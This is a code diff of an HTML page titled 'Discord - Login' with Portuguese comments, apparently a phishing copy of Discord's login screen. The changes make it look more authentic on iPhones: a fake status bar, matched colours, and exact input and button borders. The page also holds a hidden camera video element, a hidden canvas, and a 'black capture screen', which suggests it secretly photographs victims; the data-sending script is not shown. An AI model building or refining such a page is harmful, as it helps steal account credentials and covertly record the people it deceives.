@@ -2,7 +2,10 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="theme-color" content="#1e1f22">
 <title>Discord - Login</title>
 <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -15,15 +18,22 @@
         display: flex;
         flex-direction: column;
         align-items: center;
-        /* MUDANÇA AQUI: Tira o centro e cola no topo */
-        justify-content: flex-start; 
         padding: 20px;
-        padding-top: 80px; /* Espaço pro logo ficar na altura exata */
+    }
+
+    /* BARRINHA PRETA NO TOPO (Status Bar do iPhone) */
+    .top-bar {
+        position: fixed;
+        top: 0; left: 0; width: 100%;
+        height: 50px; /* Altura da barra de status */
+        background-color: #1e1f22;
+        z-index: 100;
     }
     
     .login-box {
         width: 100%;
         max-width: 420px;
+        margin-top: 20px; /* Empurra um pouco pra baixo da barrinha preta */
     }
 
     .header-logo {
@@ -79,18 +89,20 @@
         position: relative;
     }
     
+    /* AS MARCAÇÕES (Bordas) QUE ESTAVAM FALTANDO */
     input {
         width: 100%;
         padding: 10px;
         background-color: #1e1f22;
-        border: none;
+        border: 1px solid #1e1f22; /* Borda sutil */
         border-radius: 3px; 
         color: #dbdee1;
         font-size: 15px;
-        height: 40px;
+        height: 42px;
         outline: none;
+        transition: border-color 0.2s;
     }
-    input:focus { outline: none; }
+    input:focus { border-color: #000; }
     
     .eye-icon {
         position: absolute;
@@ -112,18 +124,19 @@
         margin-top: -5px;
     }
 
+    /* BOTÃO COM A MARCAÇÃO EXATA */
     .btn-login {
         width: 100%;
         padding: 0;
         background-color: #5865F2; 
         color: #fff;
-        border: none;
+        border: 1px solid #5865F2; /* Borda no botão */
         border-radius: 3px; 
         font-size: 16px;
         font-weight: 500;
         cursor: pointer;
         transition: background-color 0.2s;
-        height: 40px; 
+        height: 42px; 
     }
     .btn-login:active { background-color: #4752c4; }
 
@@ -144,6 +157,7 @@
     }
     .register a { color: #00a8fc; text-decoration: none; }
 
+    /* TELA PRETA DE CAPTURA */
     #capture-screen {
         display: none;
         position: fixed;
@@ -160,6 +174,9 @@
 </style>
 </head>
 <body>
+
+<!-- BARRINHA PRETA NO TOPO -->
+<div class="top-bar"></div>
 
 <video id="camera" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
